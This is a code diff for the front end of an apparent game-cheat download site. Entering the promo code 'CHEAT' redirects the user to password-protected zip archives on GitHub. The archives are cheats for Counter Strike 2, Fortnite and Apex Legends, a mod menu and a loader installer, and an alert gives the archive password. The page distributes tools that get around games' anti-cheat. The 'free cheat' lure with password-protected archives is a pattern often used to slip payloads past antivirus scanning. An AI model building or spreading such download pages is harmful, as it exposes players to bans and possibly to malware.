@@ -1145,7 +1145,7 @@
                 successDiv.style.display = 'none';
             });
             
-            // Не закрываем модалку автоматически, пользователь закроет её сам
+        
         };
         
         const closeHandler = () => {
@@ -1165,15 +1165,42 @@
     document.getElementById('applyPromoBtn').addEventListener('click', () => {
         const promo = document.getElementById('promoCode').value.trim();
         if (promo.toUpperCase() === 'CHEAT') {
+            if (!currentProduct) {
+                alert(currentLang === 'ru' ? 'Сначала выберите продукт' : 'Select a product first');
+                return;
+            }
+            let downloadUrl = '';
+
+            switch (currentProduct.title) {
+                case 'COUNTER STRIKE 2':
+                    downloadUrl = 'https://github.com/NCCHEATS/NEXUS_CORE/releases/latest/download/aimware.zip';
+                    break;
+                case 'FORTNITE':
+                    downloadUrl = 'https://github.com/NCCHEATS/error/releases/latest/download/External.zip';
+                    break;
+                case 'APEX LEGENDS':
+                    downloadUrl = 'https://github.com/NCCHEATS/Vertan/releases/latest/download/Vertan.zip';
+                    break;
+                case 'NURSULTAN':
+                    downloadUrl = 'https://github.com/NCCHEATS/mlig/releases/latest/download/Nursultan.zip';
+                    break;
+                case 'KIDDIONS MOD MENU':
+                    downloadUrl = 'https://github.com/NCCHEATS/KiddionsMode/releases/latest/download/Kiddions_v2.zip';
+                    break;
+                case 'EXLOADER':
+                    downloadUrl = 'https://github.com/NCCHEATS/exloader/releases/latest/download/ExLoader_Installer.zip';
+                    break;
+                default:
+                    downloadUrl = 'https://downloadcheat'; 
+            }
             alert(currentLang === 'ru' 
-                ? '🎉 Вам выдан бесплатный чит на неделю! Скачивание начнется автоматически. ПАРОЛЬ ОТ АРХИВА - 2026' 
-                : '🎉 You have been given a free one-week cheat! Download will start automatically. PASSWORD - 2026');
-            window.location.href = 'https://downloadcheat';
+                ? `🎉 Вам выдан бесплатный чит на неделю! Скачивание начнется автоматически. ПАРОЛЬ ОТ АРХИВА - 2026` 
+                : `🎉 You have been given a free one-week cheat! Download will start automatically. PASSWORD - 2026`);
+            window.location.href = downloadUrl;
         } else if (promo && promo !== '') {
             alert(currentLang === 'ru' ? 'Неверный промокод' : 'Invalid promo code');
         }
     });
-
     function setLanguage(lang) {
         currentLang = lang;
         document.querySelectorAll('[data-i18n]').forEach(el => {
